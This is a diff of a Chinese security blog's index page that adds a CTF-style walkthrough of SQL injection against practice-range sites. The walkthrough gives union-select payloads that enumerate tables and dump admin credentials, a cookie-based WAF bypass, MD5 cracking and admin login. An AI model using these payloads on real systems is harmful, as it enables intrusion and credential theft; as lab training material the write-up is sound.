@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">84</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,198 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/10/07/SQL%E6%B3%A8%E5%85%A501/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/" class="post-title-link" itemprop="url">SQL注入01</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-07 22:04:44" itemprop="dateCreated datePublished" datetime="2021-10-07T22:04:44+08:00">2021-10-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-14 17:24:31" itemprop="dateModified" datetime="2023-08-14T17:24:31+08:00">2023-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p><strong>sql注入的一般分类（按照注入数据类型）：</strong></p>
+<p>​    （1）数字型注入；当输入的参数为整型时，则有可能存在数字型注入漏洞。</p>
+<p>​    （2）字符型注入；当输入参数为字符串时，则可能存在字符型注入漏洞。</p>
+<p>​    （3）其他类型（例如：搜索型注入、Cookie注入、POST注入等）。　</p>
+<p><strong>sql注入的高级分类(按照执行效果分类)：</strong></p>
+<p>　　(1)基于布尔的盲注：即可以根据返回页面判断条件真假的注入。</p>
+<p>　　(2)基于时间的盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</p>
+<p>　　(3)基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>　　(4)联合查询注入：可以使用union的情况下的注入。</p>
+<p>　　(5)堆查询注入：可以同时执行多条语句的注入。</p>
+<p>　　(6)宽字节注入：利用gbk是多字节的编码，两个字节代表一个汉字</p>
+<p>注意：一般SQL注入都是要利用多中注入手段的</p>
+<p>学习补充链接：</p>
+<p>1.<a target="_blank" rel="noopener" href="https://www.php.cn/safe/455989.html">https://www.php.cn/safe/455989.html</a></p>
+<p>2.进阶：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl">https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl</a></p>
+<h2 id="例1：布尔盲注-联合查询-堆查询注入（无防火墙）"><a href="#例1：布尔盲注-联合查询-堆查询注入（无防火墙）" class="headerlink" title="例1：布尔盲注+联合查询+堆查询注入（无防火墙）"></a>例1：布尔盲注+联合查询+堆查询注入（无防火墙）</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
+<p>靶场传送门：<a target="_blank" rel="noopener" href="http://rhiq8003.ia.aqlab.cn/">http://rhiq8003.ia.aqlab.cn/</a></p>
+<p><strong>第0步：判断是否存在数据库存储</strong></p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093011830.png" alt="image-20210930093011830"></p>
+<p>进入后</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093059714.png" alt="image-20210930093059714"></p>
+<p><strong>第一步：判断是否存在sql注入漏洞</strong>（bool运算判断）</p>
+<p><strong>构造 ：</strong>?id=1 and 1=1 ，回车，结果页面正常</p>
+<p>说明：这里是布尔注入，构建了1=1的永真条件（这里的结果相当于没添加and 1=1，所以界面没变是正常</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093304245.png" alt="image-20210930093304245"></p>
+<p><strong>构造：</strong> ?id=1 and 1=2 ,回车。</p>
+<p>说明：1=2是永假条件，页面出现了变化（不正常），即状态回显了，可以利用这个应答效果；初步判断这里存在注入漏洞</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093544124.png" alt="image-20210930093544124"></p>
+<p><strong>第二步：判断数据库字段数（order by）</strong></p>
+<p><strong>构造：</strong> ?id=1 order by 1</p>
+<p>结果：正常，（继续测试到出现回显错误为止。）</p>
+<p>说明：order by函数是操作字段（列），如果第*列不存在，数据库会报错（回显报错）</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930094708112.png" alt="image-20210930094708112"></p>
+<p><strong>构造：</strong>?id=1 order by 3</p>
+<p>结果：页面回显出错（所以判断字段数（列数）为2）</p>
+<p>说明：因为只是加了order by语句，相当于只是做了选择，但是没有进行其他操作，所以页面应该是不会变化的，除了order by操作出错，即选择的列不存在时</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095141092.png" alt="image-20210930095141092"></p>
+<p><strong>第三步：利用错误回显来判断回显点（bool运算+select语句）</strong></p>
+<p><strong>构造：</strong> ?id=1 and 1=2 union select 1,2 </p>
+<p>结果：页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
+<p>说明：要在回显错误的界面上进行测试，select后面的字段个数（这里的1,2）是由步骤二判断出的字段数决定的。</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095601309.png" alt="image-20210930095601309"></p>
+<p><strong>第四步：查询相关内容</strong></p>
+<p>备注：都要在回显错误的界面操作</p>
+<p><strong>查询当前数据库名</strong>：构造 ?id=1 and 1=2 union select 1,database() 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100557017.png" alt="image-20210930100557017"></p>
+<p><strong>查询当前数据库版本</strong>：构造 ?id=1 and 1=2 union select 1,version() ，再回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100726382.png" alt="image-20210930100726382"></p>
+<p><strong>查询当前数据库 表名</strong></p>
+<p>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 。绝大数情况下，管理员的账号密码都在admin表里。</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100819524.png" alt="image-20210930100819524"></p>
+<p><strong>知识补充</strong></p>
+<p>（1）系统参数/变量：对于mysql、SQL、Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p><strong>information_schema.tables</strong>存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
+<ul>
+<li>table_schema: 记录<strong>数据库名</strong>；</li>
+<li>table_name: 记录<strong>数据表名</strong>；</li>
+<li>column_name ：记录<strong>字段名</strong></li>
+<li>engine : 存储<strong>引擎</strong>；</li>
+<li>table_rows: 关于表的粗略行估计；</li>
+<li>data_length : 记录<strong>表的大小</strong>（单位字节）；</li>
+<li>index_length : 记录表的<strong>索引的大小</strong>；</li>
+<li>row_format: 可以查看数据表<strong>是否压缩</strong>过；</li>
+</ul>
+<p>（2）limit 0,1 ：从第0位开始，读取1个元素（数据）；这里回显内容地方只有一个，所以limit第二个参数一直都是1.</p>
+<p><strong>查询字段名</strong></p>
+<p>穷举查出 admin 表里 有  id  username  password  三个字段</p>
+<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150327642.png" alt="image-20210930150327642"></p>
+<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 1,1 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150451365.png" alt="image-20210930150451365"></p>
+<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 2,1 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150508924.png" alt="image-20210930150508924"></p>
+<p><strong>查询字段内容</strong></p>
+<p>构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车查看<strong>账号名</strong></p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150755055.png" alt="image-20210930150755055"></p>
+<p>查到了账号名，再<strong>查看密码</strong></p>
+<p>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151402562.png" alt="image-20210930151402562"></p>
+<p><strong><em>到这里就窃取到了数据库管理员（账户）的账户（admin）和密码（hellohack）了</em></strong></p>
+<p><strong>查看数据（内容）条数</strong></p>
+<p>（密码）一直查，直到位空（回显错误），；构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150918351.png" alt="image-20210930150918351"></p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151059407.png" alt="image-20210930151059407"></p>
+<h2 id="例2：利用cookie绕过WAF网络防火墙"><a href="#例2：利用cookie绕过WAF网络防火墙" class="headerlink" title="例2：利用cookie绕过WAF网络防火墙"></a>例2：利用cookie绕过WAF网络防火墙</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
+<p>靶场传送门：<a target="_blank" rel="noopener" href="http://kypt8004.ia.aqlab.cn/">http://kypt8004.ia.aqlab.cn/</a></p>
+<p><strong>步骤0-1：判断是否存在sql注入漏洞</strong></p>
+<p>具体过程和例1步骤0相同</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930194834400.png" alt="image-20210930194834400"></p>
+<p><strong>步骤2：</strong>利用order by语句查询字段数</p>
+<p>构造?id=171 order by 11，探测出字段数为10</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195008905.png" alt="image-20210930195008905"></p>
+<p><strong>步骤3：联合查询注入（测试）</strong></p>
+<p>构造?id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin，判断是否有admin这个表。</p>
+<p>结果：经测试只要url出现select（查询）关键字，就会被防火墙拦截。。</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195432374.png" alt="image-20210930195432374"></p>
+<p>猜想：尝试将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截GET、POST传参。(绕过GET、POST请求的防火墙注入过滤)</p>
+<p><strong>步骤4：利用web插件通过cookie注入</strong></p>
+<p>说明：这里用了HackBar插件</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200409869.png" alt="image-20210930200409869"></p>
+<p><strong>查看回显效果并猜测是否存在admin表（+号代替空格，不然会出错）：</strong></p>
+<p><strong>构造cookie：</strong>id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin</p>
+<p>结果：没有出现数据库错误，这证明admin表是存在的。且第2、第3、7、8、9字段，可以用来猜测字段名，同时，可以直接回显在页面上。</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200519006.png" alt="image-20210930200519006"></p>
+<p><strong>查看username和password字段的值</strong>：</p>
+<p>测试我们接着尝试猜测最常见的管理表字段名Username和Password，我们在2、3、7、8、9中任选两个，分别填入Username和Password，比如2和3：</p>
+<p><strong>构建cookie：</strong>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin</p>
+<p>结果得到：admin（username）、b9a2a2b5dffb918c（password）</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20211001105731391.png" alt="image-20211001105731391"></p>
+<p>这应该就是管理员用户名和密码了，但管理员密码看起来有些奇怪。字母+数字的16位组合，很像md5的特征。</p>
+<p>打开cmd5.com（解密站点）</p>
+<p>将b9a2a2b5dffb918c进行解密得到密码welcome</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203334045.png" alt="image-20210930203334045"></p>
+<p><strong>步骤5：登录验证</strong></p>
+<p>在主页url补/admin/，进入admin页面（kypt8004.ia.aqlab.cn/admin/），这个站貌似是南方的CMS，默认管理员后台是根目录的/admin/。</p>
+<p>网站会自动重定向到kypt8004.ia.aqlab.cn/admin/Login.asp</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203438599.png" alt="image-20210930203438599"></p>
+<p>登录成功</p>
+<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930204247081.png" alt="image-20210930204247081"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1648,103 +1840,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">WireShark的一些知识</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-08-03 10:31:14" itemprop="dateCreated datePublished" datetime="2021-08-03T10:31:14+08:00">2021-08-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-09-07 18:53:20" itemprop="dateModified" datetime="2021-09-07T18:53:20+08:00">2021-09-07</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="WireShark的一些知识"><a href="#WireShark的一些知识" class="headerlink" title="WireShark的一些知识"></a>WireShark的一些知识</h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用"></a>1.作用</h3><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161548161.png" alt="image-20210802161548161"></p>
-<h3 id="2-模式"><a href="#2-模式" class="headerlink" title="2.模式"></a>2.模式</h3><h4 id="2-1-混杂模式"><a href="#2-1-混杂模式" class="headerlink" title="2.1 混杂模式"></a>2.1 混杂模式</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161733672.png" alt="image-20210802161733672"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161812252.png" alt="image-20210802161812252"></p>
-<h4 id="2-2过滤"><a href="#2-2过滤" class="headerlink" title="2.2过滤"></a>2.2过滤</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802161937642.png" alt="image-20210802161937642"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162009540.png" alt="image-20210802162009540"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162052506.png" alt="image-20210802162052506"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162114427.png" alt="image-20210802162114427"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162127187.png" alt="image-20210802162127187"></p>
-<h3 id="3-使用WireShark对常用协议抓包并分析原理"><a href="#3-使用WireShark对常用协议抓包并分析原理" class="headerlink" title="3 使用WireShark对常用协议抓包并分析原理"></a>3 使用WireShark对常用协议抓包并分析原理</h3><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162257783.png" alt="image-20210802162257783"></p>
-<h4 id="3-1ARP协议"><a href="#3-1ARP协议" class="headerlink" title="3.1ARP协议"></a>3.1ARP协议<img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162331955.png" alt="image-20210802162331955"></h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162420523.png" alt="image-20210802162420523"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162441441.png" alt="image-20210802162441441"></p>
-<h4 id="3-2ICMP协议"><a href="#3-2ICMP协议" class="headerlink" title="3.2ICMP协议"></a>3.2ICMP协议</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802162610320.png" alt="image-20210802162610320"></p>
-<h4 id="3-3TCP协议"><a href="#3-3TCP协议" class="headerlink" title="3.3TCP协议"></a>3.3TCP协议</h4><p>​    略</p>
-<p>​        连接：3次握手</p>
-<p>​        断开：4次挥手</p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163024228.png" alt="image-20210802163024228"></p>
-<h4 id="3-4-HTTP协议"><a href="#3-4-HTTP协议" class="headerlink" title="3.4 HTTP协议"></a>3.4 HTTP协议</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163211983.png" alt="image-20210802163211983"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163257889.png" alt="image-20210802163257889"></p>
-<h4 id="4-WireShark抓包解决服务器被黑上不了网-—之—TTL值被改"><a href="#4-WireShark抓包解决服务器被黑上不了网-—之—TTL值被改" class="headerlink" title="4 WireShark抓包解决服务器被黑上不了网 —之—TTL值被改"></a>4 WireShark抓包解决服务器被黑上不了网 —之—TTL值被改</h4><p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163534121.png" alt="image-20210802163534121"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802163931245.png" alt="image-20210802163931245"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802164135605.png" alt="image-20210802164135605"></p>
-<p><img src="/2021/08/03/WireShark%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/image-20210802164227661.png" alt="image-20210802164227661"></p>
-<p>上面的地址就是经过的路由地址</p>
-<p>补充：保存文件时，保存为pcap格式是一种兼容格式，可以在其他软件打开</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1814,7 +1909,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-count">85</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
